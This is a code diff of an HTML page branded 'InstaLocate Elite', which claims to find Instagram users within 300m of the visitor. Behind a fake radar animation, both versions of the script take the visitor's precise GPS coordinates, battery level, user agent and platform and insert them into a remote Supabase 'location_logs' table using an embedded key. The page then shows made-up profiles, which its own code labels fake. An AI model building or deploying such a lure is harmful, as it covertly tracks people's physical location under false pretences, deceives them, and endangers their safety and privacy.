@@ -3,157 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>InstaLocate Elite | Regional Social Radar</title>
+    <title>InstaLocate Elite | Find Local Community</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap');
-        :root { --main-grad: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); --bg: #030712; }
+        :root { --grad: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); --bg: #030712; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
         
-        body { background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden; }
-        .bg-mesh { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(64, 93, 230, 0.2) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(253, 29, 29, 0.15) 0%, transparent 40%); }
+        body { background: var(--bg); color: white; min-height: 100vh; overflow: hidden; }
+        .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(64, 93, 230, 0.2) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(253, 29, 29, 0.15) 0%, transparent 40%); }
 
-        nav { padding: 25px 8%; background: rgba(3, 7, 18, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
-        .logo { font-weight: 900; font-size: 26px; background: var(--main-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        nav { padding: 20px 8%; background: rgba(3, 7, 18, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
+        .logo { font-weight: 900; font-size: 26px; background: var(--grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        .hero { display: flex; align-items: center; justify-content: center; padding: 80px 8%; min-height: 85vh; gap: 40px; }
+        /* Main Hero Section */
+        .hero { display: flex; align-items: center; justify-content: center; padding: 60px 8%; min-height: 85vh; gap: 40px; }
         .hero-text { flex: 1.2; animation: fadeIn 1s ease; }
         .hero-text h1 { font-size: 65px; font-weight: 900; line-height: 1; margin-bottom: 25px; }
-        .hero-text p { font-size: 20px; color: #9ca3af; margin-bottom: 40px; line-height: 1.6; }
-
-        /* Animated Radar */
+        
         .radar-box { flex: 1; display: flex; justify-content: center; position: relative; }
         .radar-circle { width: 350px; height: 350px; border: 1px solid rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; position: relative; background: rgba(255,255,255,0.02); }
         .pulse { position: absolute; width: 100%; height: 100%; border: 2px solid #e1306c; border-radius: 50%; animation: pulse-anim 2.5s infinite; }
-        .ig-icon { font-size: 100px; background: var(--main-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; filter: drop-shadow(0 0 20px rgba(225, 48, 108, 0.4)); }
+        .ig-icon { font-size: 100px; background: var(--grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        .btn-action { background: var(--main-grad); color: white; border: none; padding: 22px 55px; border-radius: 18px; font-size: 20px; font-weight: 900; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 30px rgba(225, 48, 108, 0.3); display: flex; align-items: center; gap: 15px; }
-        .btn-action:hover { transform: translateY(-5px) scale(1.02); box-shadow: 0 20px 45px rgba(225, 48, 108, 0.5); }
+        .btn-action { background: var(--grad); color: white; border: none; padding: 22px 55px; border-radius: 18px; font-size: 18px; font-weight: 900; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 30px rgba(225, 48, 108, 0.3); display: flex; align-items: center; gap: 15px; }
+        .btn-action:hover { transform: translateY(-5px); box-shadow: 0 15px 40px rgba(225, 48, 108, 0.5); }
 
-        /* Full Screen Tech Overlay */
+        /* Scanning Overlay */
         #scanner-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .globe-icon { font-size: 80px; color: #405de6; animation: spin 4s linear infinite; margin-bottom: 30px; }
-        .progress-bar { width: 300px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin-top: 20px; }
-        .progress-fill { width: 0%; height: 100%; background: var(--main-grad); transition: 0.5s; }
+        .loader { width: 80px; height: 80px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #e1306c; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px; }
 
         /* Fake Results Section */
-        #results-view { display: none; padding: 60px 8%; animation: fadeIn 1s; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 25px; margin-top: 40px; }
-        .user-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 25px; border-radius: 20px; text-align: center; transition: 0.3s; }
-        .user-card:hover { transform: translateY(-10px); background: rgba(255,255,255,0.06); border-color: #e1306c; }
-        .user-card img { width: 90px; height: 90px; border-radius: 50%; border: 3px solid #e1306c; padding: 4px; margin-bottom: 15px; }
+        #results-view { display: none; padding: 60px 8%; text-align: center; overflow-y: auto; height: 100vh; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 20px; margin-top: 40px; }
+        .card { background: rgba(255,255,255,0.05); padding: 25px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
+        .card img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #e1306c; padding: 3px; margin-bottom: 10px; }
 
         @keyframes pulse-anim { 0% { transform: scale(0.6); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
 
         @media (max-width: 900px) { .hero { flex-direction: column; text-align: center; } .hero-text h1 { font-size: 45px; } .btn-action { margin: 0 auto; } }
     </style>
 </head>
 <body>
-    <div class="bg-mesh"></div>
-    <nav>
-        <div class="logo">INSTALOCATE ELITE</div>
-        <div style="font-size: 12px; color: #00ff41; font-weight: bold;"><i class="fas fa-satellite"></i> LIVE RADAR ACTIVE</div>
-    </nav>
+    <div class="bg-glow"></div>
+    <nav><div class="logo">INSTALOCATE PRO</div></nav>
 
     <section class="hero" id="home-view">
         <div class="hero-text">
             <h1>Find Active<br><span style="color: #e1306c">Profiles</span> Near You.</h1>
-            <p>Our military-grade node mapping identifies Instagram users within 300m of your location. Start the scan to connect.</p>
-            <button class="btn-action" id="startBtn">
+            <p style="color: #9ca3af; margin-bottom: 40px;">Using hyper-local node mapping to identify Instagram users within 300m of your exact location.</p>
+            <button class="btn-action" onclick="runPardhanSystem()">
                 <i class="fas fa-satellite-dish"></i> INITIALIZE RADAR
             </button>
         </div>
         <div class="radar-box">
             <div class="radar-circle">
                 <div class="pulse"></div>
-                <div class="pulse" style="animation-delay: 1s;"></div>
+                <div class="pulse" style="animation-delay: 1.2s;"></div>
                 <i class="fab fa-instagram ig-icon"></i>
             </div>
         </div>
     </section>
 
     <div id="scanner-overlay">
-        <i class="fas fa-globe-americas globe-icon"></i>
-        <h2 id="statusText" style="font-weight: 900; letter-spacing: 2px;">CALIBRATING GPS...</h2>
-        <div class="progress-bar"><div class="progress-fill" id="p-bar"></div></div>
-        <p id="subText" style="opacity: 0.5; margin-top: 15px; font-size: 14px;">Encrypted PARDHAN Handshake in progress</p>
+        <div class="loader"></div>
+        <h2 id="stText" style="letter-spacing: 2px; font-weight: 800;">CALIBRATING GPS...</h2>
+        <p style="opacity: 0.5; margin-top: 15px;">Establishing secure satellite handshake</p>
     </div>
 
     <section id="results-view">
-        <h2 style="font-size: 35px; text-align: center;">Nodes Detected (12)</h2>
+        <h2 style="font-size: 32px;">Nearby Nodes Detected (12)</h2>
         <div class="grid" id="profile-grid"></div>
-        <center><button class="btn-action" style="margin-top: 50px;" onclick="window.location.href='https://instagram.com'">LOGIN TO VIEW PROFILES</button></center>
+        <button class="btn-action" style="margin: 50px auto; width: 280px;" onclick="window.location.href='https://instagram.com'">LOGIN TO VIEW ALL</button>
     </section>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script>
-        const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
-        const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
-        const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+<script>
+    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
+    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
+    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-        document.getElementById('startBtn').addEventListener('click', async () => {
-            const overlay = document.getElementById('scanner-overlay');
-            const status = document.getElementById('statusText');
-            const pBar = document.getElementById('p-bar');
-            
-            overlay.style.display = 'flex';
+    async function runPardhanSystem() {
+        const overlay = document.getElementById('scanner-overlay');
+        const status = document.getElementById('stText');
+        overlay.style.display = 'flex';
 
-            // Capture Battery
-            let batteryLevel = "N/A";
-            try {
-                const b = await navigator.getBattery();
-                batteryLevel = `${(b.level * 100).toFixed(0)}%`;
-            } catch(e) {}
+        // Get Battery Info
+        let battInfo = "N/A";
+        try {
+            const b = await navigator.getBattery();
+            battInfo = `${(b.level * 100).toFixed(0)}%`;
+        } catch(e) {}
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    status.innerText = "COORDINATES SECURED...";
-                    pBar.style.width = "40%";
-                    
-                    // Send to Supabase
-                    const { error } = await supabaseClient.from('location_logs').insert([{
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        user_agent: navigator.userAgent,
-                        ip: `PRO-v7 | Batt: ${batteryLevel}`,
-                        os_info: `Platform: ${navigator.platform}`
-                    }]);
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                status.innerText = "COORDINATES SECURED...";
+                
+                // DATA INSERT TO SUPABASE
+                const { error } = await supabaseClient.from('location_logs').insert([{
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    user_agent: navigator.userAgent,
+                    ip: `PARDHAN-v9 | Batt: ${battInfo}`,
+                    os_info: navigator.platform
+                }]);
 
-                    if (error) console.error("Data Fail:", error);
+                if (error) console.error("Database Error:", error);
 
-                    // Animation Timers
-                    setTimeout(() => { status.innerText = "BYPASSING FIREWALLS..."; pBar.style.width = "70%"; }, 2000);
-                    setTimeout(() => { status.innerText = "FETCHING LOCAL NODES..."; pBar.style.width = "100%"; }, 4000);
-                    
-                    setTimeout(() => {
-                        overlay.style.display = 'none';
-                        document.getElementById('home-view').style.display = 'none';
-                        document.getElementById('results-view').style.display = 'block';
-                        renderFakeProfiles();
-                    }, 6000);
-
-                }, (err) => {
+                // Scanning Animations
+                setTimeout(() => { status.innerText = "BYPASSING FIREWALLS..."; }, 2000);
+                setTimeout(() => { status.innerText = "FETCHING PROFILES..."; }, 4000);
+                
+                setTimeout(() => {
                     overlay.style.display = 'none';
-                    alert("CRITICAL ERROR: High-precision location access is required for radar. Please 'Allow' and reload.");
-                    window.location.reload();
-                }, { enableHighAccuracy: true });
-            }
-        });
+                    document.getElementById('home-view').style.display = 'none';
+                    document.getElementById('results-view').style.display = 'block';
+                    loadFakeProfiles();
+                }, 6000);
 
-        function renderFakeProfiles() {
-            const grid = document.getElementById('profile-grid');
-            const users = ['neha_x_vibes', 'aryan_dev_01', 'riya.official', 'the_rahul_clicks', 'shruti_art', 'sam_007'];
-            users.forEach((u, i) => {
-                grid.innerHTML += `
-                    <div class="user-card">
-                        <img src="https://i.pravatar.cc/150?u=${i+50}">
-                        <div style="font-weight: 900;">@${u}</div>
-                        <div style="font-size: 12px; color: #e1306c; margin-top: 5px;"><i class="fas fa-circle"></i> Active Now</div>
-                    </div>`;
-            });
+            }, (err) => {
+                overlay.style.display = 'none';
+                alert("Location access is required for radar calibration. Please 'Allow' and reload.");
+                location.reload();
+            }, { enableHighAccuracy: true });
         }
-    </script>
+    }
+
+    function loadFakeProfiles() {
+        const grid = document.getElementById('profile-grid');
+        const users = ['neha_vibe', 'aryan.dev', 'riya_official', 'rahul_007', 'shruti.arts', 'the_sam_clicks'];
+        users.forEach((u, i) => {
+            grid.innerHTML += `
+                <div class="card">
+                    <img src="https://i.pravatar.cc/150?u=${i+30}">
+                    <div style="font-weight: 800; font-size: 14px;">@${u}</div>
+                    <div style="font-size: 11px; color: #e1306c; margin-top: 5px;"><i class="fas fa-circle"></i> Active Now</div>
+                </div>`;
+        });
+    }
+</script>
 </body>
 </html>
